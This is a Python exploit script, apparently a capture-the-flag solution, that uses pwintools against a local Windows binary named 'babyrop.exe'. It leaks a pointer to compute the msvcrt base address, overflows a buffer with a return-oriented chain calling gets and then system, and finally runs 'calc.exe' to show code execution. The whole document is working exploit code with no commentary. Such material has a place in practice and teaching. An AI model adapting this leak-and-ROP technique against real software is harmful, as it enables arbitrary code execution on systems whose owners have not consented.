# https://gist.github.com/bash-c/6c178705bb4cca51d43a048feb62f395#file-pwintools-py
from pwintools import *
from time import sleep

io = process("babyrop.exe")

io.sendline("a" * 24)
sleep(0.01)
io.recvuntil("a" * 24)

mscvr_base = u32(io.recv(4)) - 0x26e2d

print("mscvr_base -> {:#x}".format(mscvr_base))
system = mscvr_base + 0x307fb
print("system -> {:#x}".format(system))
gets = mscvr_base + 0x3543f
print("gets -> {:#x}".format(gets))
cmd = mscvr_base + 0xb1000 + 0x500
print("cmd -> {:#x}".format(cmd))
pecx = mscvr_base + 0x35511

payload = "0" * 0xcc + 'aaaa' 
payload += p32(gets) + p32(pecx) + p32(cmd) 
payload += p32(system) + 'bbbb' + p32(cmd)

io.sendlineafter("length", str(len(payload) + 10))
sleep(0.01)

raw_input("DEBUG: ")
io.sendline(payload)
sleep(0.01)
io.sendline()

sleep(0.01)
io.sendline("calc.exe")

io.interactive()